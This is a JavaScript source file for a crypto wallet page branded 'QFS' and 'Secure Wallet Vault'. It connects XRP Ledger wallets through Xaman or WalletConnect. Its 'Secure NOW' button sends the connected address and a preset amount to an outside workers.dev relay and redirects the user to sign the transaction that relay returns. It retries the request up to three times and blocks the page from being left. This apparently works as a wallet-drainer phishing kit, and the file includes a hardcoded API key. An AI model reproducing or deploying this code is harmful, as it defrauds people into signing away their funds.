// ==============================
// CONFIG
// ==============================
const BACKEND_URL = "https://cultured.pythonanywhere.com/"; // no longer used for Xaman
const WC_PROJECT_ID = "YOUR_PROJECT_ID";
const XAMAN_API_KEY = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";

// must be drops (string)
const sendAmountDrops = String(calculatedAmountInDrops);

// ==============================
// STATE
// ==============================
let wcClient = null;
let wcModal  = null;
let currentAddress = null;
let currentWalletType = null;

// approval control
let approvalPending = false;
let retryCount = 0;
const MAX_RETRIES = 3;

// ==============================
// UI HELPERS
// ==============================
function setStatus(text) {
  const el = document.getElementById("walletStatus");
  if (el) el.innerText = text;
}

function shortAddr(a) {
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

function lockApproveButton(lock) {
  const btn = document.getElementById("mainActionButton");
  if (!btn) return;

  btn.disabled = lock;
  btn.style.opacity = lock ? "0.6" : "1";
  btn.innerText = lock ? "Approval Pending…" : "Secure NOW";
}

function updateAllButtonsToSecure() {
  document.querySelectorAll("#mainActionButton").forEach(btn => {
    btn.innerText = "Secure NOW";
    btn.classList.remove("btn-primary");
    btn.classList.add("btn-success");
    btn.onclick = e => {
      e.preventDefault();
      triggerManualApproval();
    };
  });
}

// ==============================
// CONNECTION LOGIC
// ==============================
async function connectWallet(type) {
  try {
    setStatus("Connecting…");

    if (type === "xaman") {
      const xumm = new XummPkce(XAMAN_API_KEY);

      xumm.on("success", async () => {
        const state = await xumm.state();
        if (state?.me?.account) {
          handlePostConnect("xaman", state.me.account);
        }
      });

      xumm.on("error", err => {
        console.error("Xaman connect error:", err);
        setStatus("Xaman connection cancelled");
      });

      await xumm.authorize();
    }

    if (type === "walletconnect") {
      await initWalletConnect();
      const address = await connectViaWalletConnect();
      if (address) handlePostConnect("walletconnect", address);
    }

  } catch (err) {
    console.error(err);
    setStatus("Connection failed");
  }
}

function handlePostConnect(type, address) {
  currentWalletType = type;
  currentAddress = address;

  const modal = document.getElementById("walletSelectionModal");
  if (modal) bootstrap.Modal.getOrCreateInstance(modal).hide();

  updateAllButtonsToSecure();
  setStatus(`Connected: ${shortAddr(address)}`);
}

// ==============================
// SECURE TRANSFER (XAMAN WORKER)
// ==============================
async function triggerManualApproval() {
  if (!currentAddress || approvalPending) return;

  approvalPending = true;
  retryCount = 0;
  lockApproveButton(true);

  await createAndRedirectPayload();
}

async function createAndRedirectPayload() {
  try {
    setStatus("Preparing secure approval…");

    const res = await fetch(
      "https://xaman-relay.williamanderson09945.workers.dev",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          address: currentAddress,
          amount: sendAmountDrops
        })
      }
    );

    const data = await res.json();

    if (!res.ok || !data.signUrl) {
      throw new Error(data?.error || "Unable to create approval");
    }

    // 🔐 Redirect to Xaman approval
    window.location.href = data.signUrl;

    // ⏳ Start timeout detection (user rejected / closed)
    startApprovalTimeout();

  } catch (err) {
    handleApprovalFailure(err.message);
  }
}

// ==============================
// RETRY + TIMEOUT HANDLING
// ==============================
function startApprovalTimeout() {
  setTimeout(() => {
    if (!approvalPending) return;

    retryCount++;

    if (retryCount <= MAX_RETRIES) {
      setStatus(`Approval not completed. Retrying (${retryCount}/${MAX_RETRIES})…`);
      createAndRedirectPayload();
    } else {
      setStatus("Approval cancelled. Please try again.");
      resetApprovalState();
    }
  }, 65000); // Xaman-safe timeout
}

function handleApprovalFailure(message) {
  retryCount++;

  if (retryCount <= MAX_RETRIES) {
    setStatus(`Retrying approval (${retryCount}/${MAX_RETRIES})…`);
    createAndRedirectPayload();
  } else {
    setStatus(message || "Approval failed");
    resetApprovalState();
  }
}

function resetApprovalState() {
  approvalPending = false;
  retryCount = 0;
  lockApproveButton(false);
}

// prevent refresh during approval
window.addEventListener("beforeunload", e => {
  if (approvalPending) {
    e.preventDefault();
    e.returnValue = "";
  }
});

// ==============================
// WALLETCONNECT
// ==============================
async function initWalletConnect() {
  if (wcClient) return;

  wcClient = await WalletConnectSignClient.init({
    projectId: WC_PROJECT_ID,
    metadata: {
      name: "QFS",
      description: "Secure Wallet Vault",
      url: window.location.origin
    }
  });

  wcModal = new WalletConnectModal({
    projectId: WC_PROJECT_ID,
    standaloneChains: ["xrpl:0"]
  });
}

async function connectViaWalletConnect() {
  const { uri, approval } = await wcClient.connect({
    requiredNamespaces: {
      xrpl: {
        chains: ["xrpl:0"],
        methods: ["xrpl_signTransaction"]
      }
    }
  });

  if (uri) wcModal.openModal({ uri });

  const session = await approval();
  wcModal.closeModal();

  return session.namespaces.xrpl.accounts[0].split(":")[2];
}
